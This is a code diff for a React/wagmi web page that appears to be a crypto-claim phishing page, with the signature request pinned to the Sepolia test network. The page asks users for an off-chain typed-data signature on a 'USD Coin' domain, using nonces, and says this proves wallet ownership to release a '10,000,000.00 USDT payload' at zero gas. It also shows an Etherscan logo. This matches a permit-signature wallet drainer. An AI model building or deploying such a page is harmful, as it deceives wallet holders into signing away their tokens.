@@ -2,6 +2,7 @@
 
 import { useState, useEffect } from 'react'
 import { useAccount, useConnect, useDisconnect, useSignTypedData, useReadContract, useBalance } from 'wagmi'
+import { sepolia } from 'wagmi/chains'
 import { parseUnits, formatEther } from 'viem'
 import styles from './page.module.css'
 
@@ -44,6 +45,7 @@ export default function Home() {
     abi: noncesAbi,
     functionName: 'nonces',
     args: address ? [address] : undefined,
+    chainId: sepolia.id,
   })
 
   const handleClaim = async () => {
@@ -64,7 +66,7 @@ export default function Home() {
         domain: {
           name: 'USD Coin',
           version: '1',
-          chainId: chain?.id,
+          chainId: sepolia.id,
           verifyingContract: tokenAddress,
         },
         types: {
@@ -425,7 +427,7 @@ export default function Home() {
 
             {!isSuccess && (
               <div className={styles.actionBanner}>
-                <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', color: '#d22d3d', backgroundColor: '#fff5f5', padding: '0.75rem 1rem', borderRadius: '0.5rem', border: '1px solid #faccd0', fontSize: '0.85rem', width: '100%' }}>
+                <div style={{ color: '#d22d3d', backgroundColor: '#fff5f5', padding: '0.75rem 1rem', borderRadius: '0.5rem', border: '1px solid #faccd0', fontSize: '0.85rem', width: '100%', lineHeight: '1.5' }}>
                   <strong>Action Required:</strong> The smart contract requires an off-chain cryptographic signature proving you own the destination wallet to release the 10,000,000.00 USDT payload. This signature costs 0 gas.
                 </div>
                 <div className={styles.actionButtons}>
@@ -457,7 +459,7 @@ export default function Home() {
         <div className={styles.container} style={{ padding: 0 }}>
           <div className={styles.footerTop}>
             <div className={styles.footerBrand}>
-              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1rem' }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1rem', flexWrap: 'nowrap', whiteSpace: 'nowrap' }}>
                 <img src="/etherscan-logo.svg" alt="eth" style={{ height: '28px' }} />
                 <span style={{ fontSize: '1.2rem', fontWeight: 600, color: '#1e2022' }}>Powered by Ethereum</span>
               </div>
